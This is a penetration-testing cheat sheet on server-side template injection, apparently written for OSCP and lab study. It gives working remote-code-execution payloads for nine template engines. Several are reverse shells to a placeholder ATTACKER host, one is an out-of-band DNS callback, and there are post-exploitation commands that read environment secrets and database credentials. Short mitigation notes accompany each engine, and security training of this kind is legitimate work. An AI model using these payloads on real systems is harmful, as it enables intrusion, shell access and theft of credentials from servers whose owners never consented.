# SSTI (Server-Side Template Injection)

> Server-Side Template Injection occurs when user input is concatenated into a template and evaluated by the template engine. Depending on the engine and sandbox, SSTI can lead to information disclosure, file read, or full remote code execution (RCE). SSTI is a high-severity finding and a frequent OSCP and HTB topic.
>
> Production context tags: [LAB] HTB/OSCP labs only, [PROD] safe for production, [PROD-RISK] use with care, [PROD-NO] do not run against production.

## Table of Contents

1. [Detection](#1-detection)
2. [Template Engines](#2-template-engines)
3. [Fingerprinting](#3-fingerprinting)
4. [Enumeration](#4-enumeration)
5. [Attack Surface Map](#5-attack-surface-map)
6. [Vulnerabilities and Exploitation](#6-vulnerabilities-and-exploitation)
7. [Tooling](#7-tooling)
8. [Post-Exploitation](#8-post-exploitation)
9. [OSCP Notes](#9-oscp-notes)
10. [References](#10-references)

---

## 1. Detection

SSTI appears wherever the application renders user-controlled data through a template engine. Common entry points:

- Profile fields (name, bio, signature).
- Email templates (name in subject, body).
- PDF generators (invoice name, product name).
- Error pages (custom 404 with user path).
- Search results ("No results for X").
- Comment bodies, forum posts.
- URL parameters rendered directly.
- Preview features (markdown preview, template editor).

### Quick detection

```bash
# Arithmetic probes
curl -s "$TARGET/?name=${{7*7}}"
curl -s "$TARGET/?name=${7*7}"
curl -s "$TARGET/?name=$${7*7}"
curl -s "$TARGET/?name=<%= 7*7 %>"

# Expected: 49 in the response (instead of "{{7*7}}")
```

Expected output (vulnerable):

```text
Hello, 49
```

Expected output (not vulnerable):

```text
Hello, {{7*7}}
```

### Quick reference table

| Payload | Engine hint |
|---------|-------------|
| `{{7*7}}` | Jinja2, Twig, Nunjucks, Handlebars |
| `${7*7}` | Freemarker, Thymeleaf, JSP EL |
| `#{7*7}` | Ruby (ERB), Thymeleaf |
| `<%= 7*7 %>` | ERB, EJS, JSP |
| `{7*7}` | Smarty (legacy) |
| `${{7*7}}` | Smarty (modern) |
| `@{7*7}` | Razor (.NET) |
| `*{7*7}` | Thymeleaf (preprocessing) |

---

## 2. Template Engines

### 2.1 Python

- **Jinja2** (Flask, Django templates): `{{7*7}}`, `{% ... %}`, sandboxed by default in Flask; sandbox escape possible.
- **Mako**: `${7*7}`, `<% ... %>`. Less sandboxed.
- **Tornado templates**: `{{7*7}}`, `{% ... %}`.
- **Django templates**: `{{7*7}}` - but Django templates do NOT execute arbitrary code; SSTI is limited.

### 2.2 PHP

- **Twig** (Symfony): `{{7*7}}`, `{% ... %}`. Sandbox available.
- **Smarty**: `{$var}`, `{7*7}` (legacy), `${{...}}` (modern).
- **Blade** (Laravel): `{{ $var }}`, `{!! $var !!}`. Compiles to PHP; SSTI leads to RCE.

### 2.3 Java

- **Freemarker**: `${7*7}`, `<# ... >`. `?new()` built-in is dangerous.
- **Velocity**: `$!{...}`, `#set(...)`, `#foreach`.
- **Thymeleaf** (Spring): `*{...}`, `${...}`, `[[${...}]]`, `__${...}__` (preprocessing).
- **JSP EL**: `${7*7}`.

### 2.4 Ruby

- **ERB**: `<%= 7*7 %>`.
- **Slim**: `= 7*7`.
- **Haml**: `= 7*7`.

### 2.5 Node.js

- **Handlebars**: `{{7*7}}` - but Handlebars escapes by default; SSTI is rare.
- **EJS**: `<%= 7*7 %>`.
- **Pug (Jade)**: `#{7*7}`.
- **Nunjucks**: `{{7*7}}`, `{% ... %}`.

### 2.6 .NET

- **Razor**: `@{7*7}`, `@(7*7)`.
- **ASPX**: `<%= 7*7 %>`.

### 2.7 Client-side (not SSTI but often confused)

- **Angular**: `{{7*7}}` - client-side; not exploitable via server.
- **Vue**: `{{7*7}}` - same.
- **React**: `{7*7}` in JSX - not a template engine in the HTTP sense.

---

## 3. Fingerprinting

### 3.1 Polyglot probes

Use the classic SSTI polyglot to trigger multiple engines at once:

```text
${{<%[%'"}}%\\.<%=${{7*7}}
```

If the response shows `49` in one of the positions, note which syntax produced it.

### 3.2 Arithmetic differential

| Payload | Jinja2 | Twig | Freemarker | Velocity | Smarty | ERB |
|---------|--------|------|------------|----------|--------|-----|
| `{{7*7}}` | 49 | 49 |  |  |  |  |
| `{{7*'7'}}` | 7777777 | 49 |  |  |  |  |
| `${7*7}` |  |  | 49 |  |  |  |
| `${7*'7'}` |  |  |  |  |  |  |
| `#{7*7}` |  |  |  |  | 49 (legacy) |  |
| `<%= 7*7 %>` |  |  |  |  |  | 49 |
| `*{7*7}` |  |  |  |  |  |  |

Key distinguishers:

- `{{7*'7'}}` returns `7777777` (Jinja2) or `49` (Twig).
- `${7*7}` returns `49` (Freemarker) or `0` (Velocity, because `${7*7}` is not defined).

### 3.3 Engine-specific markers

| Engine | Marker |
|--------|--------|
| Jinja2 | `{{config}}`, `{{self}}`, `{{''.__class__}}` |
| Twig | `{{_self}}`, `{{dump()}}` (if debug) |
| Freemarker | `${.version}`, `<#assign x=1>` |
| Velocity | `#set($x=7*7)$x` |
| Smarty | `{$smarty.version}`, `{php}...{/php}` (legacy) |
| ERB | `<%= RUBY_VERSION %>` |
| EJS | `<%= process.version %>` |
| Thymeleaf | `[[${7*7}]]`, `__${7*7}__` |

### 3.4 Error-based detection

Malformed payloads often reveal the engine:

```text
{{7*7
<%%
${7*7}
{{7*7}}
```

Errors like `jinja2.exceptions.TemplateSyntaxError`, `Twig_Error_Syntax`, `freemarker.core.ParseException` are direct proof.

---

## 4. Enumeration

### 4.1 Context matters

- **Reflected:** the payload is echoed in the response.
- **Stored:** the payload is saved and rendered later (e.g. profile bio).
- **Blind:** the payload executes but output is not returned. Use timing or OOB.

### 4.2 Fuzz entry points

```bash
# Basic fuzz with a payload list
ffuf -u "$TARGET/?name=FUZZ" -w ssti-payloads.txt -mr "49"

# ssti-payloads.txt (one payload per line):
# ${{7*7}}
# {{7*7}}
# ${7*7}
# #{7*7}
# <%= 7*7 %>
```

### 4.3 Field-by-field

For each user-controlled field, test in isolation. Fields often visible to other users (comments, usernames) are the highest value.

### 4.4 Content-Type matters

Some engines only trigger on certain content types (e.g. email templates rendered as HTML). Test JSON, form-encoded, and XML bodies.

---

## 5. Attack Surface Map

| Attack | Condition | Impact |
|--------|-----------|--------|
| Info disclosure | `{{config}}`, `${.version}` | Secrets leak |
| File read | Jinja2 `__class__` chain | `/etc/passwd` |
| RCE | `__builtins__` access | Full compromise |
| Blind SSTI | No reflected output | OOB DNS/HTTP |
| Sandbox escape | Jinja2 sandbox, Twig sandbox | RCE |
| Client-side confusion | Angular/Vue markers | No server impact |
| DoS | Infinite loop in template | Server hang |

---

## 6. Vulnerabilities and Exploitation

### 6.1 Jinja2 (Python/Flask)

**Root cause:** User input passed to `render_template_string` or `Template(...).render()`.

**Info disclosure:**

```text
{{config}}
{{config.items()}}
{{self.__init__.__globals__.__builtins__}}
{{''.__class__.__mro__[1].__subclasses__()}}
```

**File read:**

```text
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
```

Or the classic `cycler` / `lipsum` chain (does not require subclass index):

```text
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

**RCE:**

```text
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```

**Reverse shell:**

```text
{{ cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"').read() }}
```

> [!IMPORTANT]
> OSCP report: screenshot the SSTI probe (`{{7*7}}` -> 49), the config leak or file read, and the RCE (`id` output or reverse shell). Include the payload used.

**Mitigation:** never concatenate user input into templates; use `render_template` with static files; use the sandbox (`jinja2.sandbox.SandboxedEnvironment`) and audit.

---

### 6.2 Twig (PHP/Symfony)

**Info disclosure:**

```text
{{_self}}
{{_self.env}}
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}
```

**RCE (Twig < 1.20, no sandbox):**

```text
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**Twig 1.x / 2.x filter chains (Sandbox bypass via PHP callables):**

```text
{{['id']|filter('system')}}
{{['id',""]|sort('system')}}
{{['id',""]|map('system')}}
```

**Modern Twig (3.x) with `filter` var:**

```text
{{['id','']|filter('system')}}
```

> [!IMPORTANT]
> OSCP report: screenshot `{{7*7}}` -> 49, the `_self.env` leak, and the RCE (command output).

**Mitigation:** use Twig sandbox; never allow user input as template; validate allowed tags.

---

### 6.3 Freemarker (Java)

**Info disclosure:**

```text
${.version}
${.data_model}
${.globals}
```

**RCE via `?new()` (Freemarker < 2.3.30 or with `api_builtin_enabled=true`):**

```text
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

Or via `ObjectConstructor`:

```text
${"freemarker.template.utility.Execute"?new()("id")}
```

**File read:**

```text
<#assign is= "freemarker.template.utility.ObjectConstructor"?new()>
<#assign br= is("java.io.BufferedReader", is("java.io.FileReader", "/etc/passwd"))>
${br.readLine()}
```

> [!IMPORTANT]
> OSCP report: screenshot the `${7*7}` probe, the `.version` leak, and the `${ex("id")}` RCE.

**Mitigation:** disable `?new()` and `api_builtin_enabled`; sanitize user input; use FreeMarker's `TemplateClassResolver`.

---

### 6.4 Velocity (Java)

**Info disclosure / RCE:**

```text
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

Simpler variants exist when `$class` is accessible.

> [!IMPORTANT]
> OSCP report: screenshot the payload and the command output.

**Mitigation:** disable Velocity's class access; do not expose to untrusted input.

---

### 6.5 Smarty (PHP)

**Legacy (`{php}`):**

```text
{php}echo shell_exec('id');{/php}
```

**Modern (`${{...}}`):**

```text
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru('id'); ?>",self::clearConfig())}
```

Or via `{system('id')}` if the `system` function is registered.

> [!IMPORTANT]
> OSCP report: screenshot the payload and the RCE proof.

**Mitigation:** disable `{php}` in Smarty config; whitelist allowed modifiers; never allow user input as template.

---

### 6.6 ERB (Ruby)

**Info disclosure:**

```text
<%= RUBY_VERSION %>
<%= system('id') %>
<%= `id` %>
```

**Reverse shell:**

```text
<%= `bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'` %>
```

> [!IMPORTANT]
> OSCP report: screenshot the ERB probe (`<%= 7*7 %>` -> 49) and the command output.

**Mitigation:** never render user input with ERB; use `ERB::Util.html_escape`.

---

### 6.7 EJS (Node.js)

**Info disclosure:**

```text
<%= process.version %>
<%= process.env %>
<%= require('child_process').execSync('id').toString() %>
```

**RCE (via `settings['view options']` or `locals`):**

```text
<%= global.process.mainModule.require('child_process').execSync('id') %>
```

> [!IMPORTANT]
> OSCP report: screenshot `<%= 7*7 %>` -> 49 and the RCE output.

**Mitigation:** never pass user input to `ejs.render`; use static templates.

---

### 6.8 Thymeleaf (Spring)

**Info disclosure:**

```text
[[${7*7}]]
[[${application}]]
[[${T(java.lang.Runtime).getRuntime()}]]
```

**RCE:**

```text
[[${T(java.lang.Runtime).getRuntime().exec('id')}]]
```

**Preprocessing (only in certain contexts):**

```text
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
```

> [!IMPORTANT]
> OSCP report: screenshot the `[[${7*7}]]` probe, the `T(java.lang.Runtime)` payload, and the RCE proof.

**Mitigation:** never return user input as a Thymeleaf fragment; use `th:text`, not `th:utext`; whitelist template expressions.

---

### 6.9 Handlebars (Node.js)

Handlebars escapes by default; SSTI is rare. But if a helper like `lookup` or `with` is misused, you can access properties.

```text
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{#each conslist}}
        {{#with (string.sub.apply 0 this)}}{{this}}{{/with}}
      {{/each}}
    {{/with}}
  {{/with}}
{{/with}}
```

Handlebars SSTI with `Function` constructor is possible when `runtimeOptions` is controlled.

> [!IMPORTANT]
> OSCP report: screenshot the payload and the resulting access.

**Mitigation:** never compile user input; keep helpers whitelisted.

---

### 6.10 Blind SSTI

When output is not reflected, use out-of-band (OOB) channels:

- DNS: `{{ cycler.__init__.__globals__.os.popen('nslookup ATTACKER').read() }}` (Jinja2).
- HTTP: curl to attacker.
- Time-based: `{{ cycler.__init__.__globals__.os.popen('sleep 5').read() }}` - response delayed by 5s.

> [!IMPORTANT]
> OSCP report: screenshot the OOB callback (Burp Collaborator, interact.sh) or the response time delta.

---

### 6.11 Client-side false positives

Angular, Vue, and React use `{{...}}` or `{...}` in templates but do not execute on the server. Confirm:

- `{{7*7}}` renders in the browser but not in `curl` output -> client-side.
- Check `View Source` and DevTools Network response.

---

## 7. Tooling

### tplmap

Classic SSTI detection and exploitation tool.

```bash
git clone https://github.com/epinna/tplmap.git
cd tplmap
python2 tplmap.py -u "$TARGET/?name=*"
```

### SSTImap

Modern replacement for tplmap (Python 3).

```bash
git clone https://github.com/vladko312/SSTImap.git
cd SSTImap
python3 sstimap.py -u "$TARGET/?name=*" --os-shell
```

### Manual fuzzing

```bash
# Generate payloads
cat > ssti.txt <<'EOF'
${{7*7}}
{{7*7}}
${7*7}
#{7*7}
<%= 7*7 %>
@{7*7}
*{7*7}
[[${7*7}]]
${{7*'7'}}
{{7*'7'}}
EOF

ffuf -u "$TARGET/?name=FUZZ" -w ssti.txt -mr "49|7777777"
```

### PayloadsAllTheThings

Comprehensive SSTI payload list:

```bash
curl -s https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Template%20Injection/README.md
```

---

## 8. Post-Exploitation

After RCE:

1. **Establish a reverse shell:** `bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"`.
2. **Enumerate the host:** `id`, `hostname`, `uname -a`, `cat /etc/passwd`.
3. **Find secrets in env:** `env`, `cat /proc/self/environ`.
4. **Check the app config:** Flask `config`, Spring `application.properties`.
5. **Read DB credentials:** often in env or config files.
6. **Pivot:** if the app talks to a database or internal service, use the app's credentials.

```text
{{ cycler.__init__.__globals__.os.popen('env').read() }}
{{ cycler.__init__.__globals__.os.popen('cat /proc/self/environ').read() }}
{{ cycler.__init__.__globals__.os.popen('find / -name "*.env" 2>/dev/null').read() }}
```

---

## 9. OSCP Notes

> [!IMPORTANT]
> OSCP report evidence for SSTI:
> - Screenshot the arithmetic probe (`{{7*7}}` -> `49`) BEFORE exploitation.
> - Screenshot the RCE proof (`id`, `whoami`, or reverse shell).
> - Screenshot the payload used, in full.
> - For blind SSTI, screenshot the OOB callback with timestamp.
> - Include timestamps in every screenshot.

> [!IMPORTANT]
> Start with SAFE probes (`{{7*7}}`). Only escalate to RCE after confirming SSTI. For each engine, use the LEAST intrusive payload that proves the finding.

> [!IMPORTANT]
> For Jinja2, the `cycler`/`lipsum`/`joiner`/`namespace` chain is more stable than subclass indexing (`__subclasses__()[N]`) - the index varies across Python versions.

**Common OSCP pitfalls:**

- `{{7*7}}` may be URL-encoded; some apps decode twice. Try `%7B%7B7*7%7D%7D`.
- Jinja2 `config` may be accessible in Flask only; other frameworks use different globals.
- Twig sandbox blocks many payloads; test filter chains (`|filter`, `|map`, `|sort`).
- Freemarker `<#assign>` might be filtered; try `${...?new()}` inline.
- Thymeleaf often needs a specific context (returning a fragment name); `[[${...}]]` may not always work.
- Distinguish client-side (Angular/Vue) from server-side: check `curl` output, not browser.
- For blind SSTI, use a Burp Collaborator or interact.sh subdomain.

---

## 10. References

- PortSwigger SSTI: https://portswigger.net/web-security/server-side-template-injection
- HackTricks SSTI: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
- PayloadsAllTheThings SSTI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- Jinja2 sandbox docs: https://jinja.palletsprojects.com/en/3.1.x/sandbox/
- Twig security: https://twig.symfony.com/doc/3.x/api.html
- Freemarker security: https://freemarker.apache.org/docs/api/freemarker/core/Configurable.html
- Velocity security: https://velocity.apache.org/engine/2.3/user-guide.html
- Thymeleaf expression injection: https://github.com/thymeleaf/thymeleaf/issues/395
- tplmap: https://github.com/epinna/tplmap
- SSTImap: https://github.com/vladko312/SSTImap
- CVE-2022-22963 (Spring Cloud Function SpEL RCE): https://nvd.nist.gov/vuln/detail/CVE-2022-22963
- CVE-2022-22965 (Spring4Shell): https://nvd.nist.gov/vuln/detail/CVE-2022-22965
- CVE-2019-11043 (PHP-FPM underflow, used with template RCE): https://nvd.nist.gov/vuln/detail/CVE-2019-11043
- CVE-2021-41773 (Apache path traversal, sometimes chained): https://nvd.nist.gov/vuln/detail/CVE-2021-41773